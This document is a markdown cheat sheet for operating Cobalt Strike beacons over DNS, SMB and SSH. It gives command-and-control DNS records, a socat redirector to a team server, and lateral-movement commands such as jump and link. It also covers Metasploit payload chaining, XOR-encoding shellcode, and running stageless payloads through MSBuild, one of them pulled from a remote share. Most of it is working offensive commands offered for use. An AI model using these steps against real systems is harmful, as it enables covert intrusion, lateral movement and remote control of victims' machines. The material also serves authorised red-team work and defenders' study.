# Cobalt Strike - Beacons

## DNS Beacon

### DNS Configuration

* Edit the `Zone File` for the domain
* Create an `A record` for Cobalt Strike system
* Create an `NS record` that points to FQDN of your Cobalt Strike system

Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a `DNS A` record and point it to your Cobalt Strike team server. Use `DNS NS` records to delegate several domains or sub-domains to your Cobalt Strike team server's `A` record.


Example of DNS on Digital Ocean:

```powershell
NS  example.com                     directs to 10.10.10.10.            86400
NS  polling.campaigns.example.com   directs to campaigns.example.com.	3600
A	campaigns.example.com           directs to 10.10.10.10	            3600 
```

After creating a DNS listener (`Beacon DNS`), verify that your domains resolve to `0.0.0.0`

* `nslookup jibberish.beacon polling.campaigns.domain.com`
* `nslookup jibberish.beacon campaigns.domain.com`

If you have trouble with DNS, you can restart the `systemd` service and force Google DNS nameservers.

```powershell
systemctl disable systemd-resolved
systemctl stop systemd-resolved
rm /etc/resolv.conf
echo "nameserver 8.8.8.8" >  /etc/resolv.conf
echo "nameserver 8.8.4.4" >>  /etc/resolv.conf
```


### DNS Redirector

```ps1
socat -T 1 udp4-listen:53,fork udp4:teamserver.example.net:53
```

Debug the DNS queries with `tcpdump -l -n -s 5655 -i eth0  udp port 53`.


### DNS Mode

| Mode | Description |
| --- | --- |
| `mode dns-txt` | DNS TXT record data channel (default) |
| `mode dns`     | DNS A record data channel |
| `mode dns6`    | DNS AAAA record channel |


## SMB Beacon   

```powershell
link [host] [pipename]
connect [host] [port]
unlink [host] [PID]
jump [exec] [host] [pipe]
```

SMB Beacon uses Named Pipes. You might encounter these error code while running it.

| Error Code | Meaning              | Description                                        |
|------------|----------------------|----------------------------------------------------|
| 2          | File Not Found       | There is no beacon for you to link to              |
| 5          | Access is denied     | Invalid credentials or you don't have permission   |
| 53         | Bad Netpath          | You have no trust relationship with the target system. It may or may not be a beacon there. |


## SSH Beacon

```powershell
# deploy a beacon
beacon> help ssh
Use: ssh [target:port] [user] [pass]
Spawn an SSH client and attempt to login to the specified target

beacon> help ssh-key
Use: ssh [target:port] [user] [/path/to/key.pem]
Spawn an SSH client and attempt to login to the specified target

# beacon's commands
upload                    Upload a file
download                  Download a file
socks                     Start SOCKS4a server to relay traffic
sudo                      Run a command via sudo
rportfwd                  Setup a reverse port forward
shell                     Execute a command via the shell
```


## Metasploit compatibility

* Payload: `windows/meterpreter/reverse_http or windows/meterpreter/reverse_https`
* Set `LHOST` and `LPORT` to the beacon
* Set `DisablePayloadHandler` to `True`
* Set `PrependMigrate` to `True`
* `exploit -j`


## Custom Payloads

```powershell
* Attacks > Packages > Payload Generator 
* Attacks > Packages > Scripted Web Delivery (S)
$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
$ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
$ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
```


## References

* [Cobalt Strike > User Guide > DNS Beacon](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_beacon-dns.htm)
* [Simple DNS Redirectors for Cobalt Strike - Thursday 11 March, 2021](https://www.cobaltstrike.com/blog/simple-dns-redirectors-for-cobalt-strike)
* [CobaltStrike DNS Beacon Lab Setup - rioasmara - March 18, 2023](https://rioasmara.com/2023/03/18/cobaltstrike-dns-beacon-lab-setup/)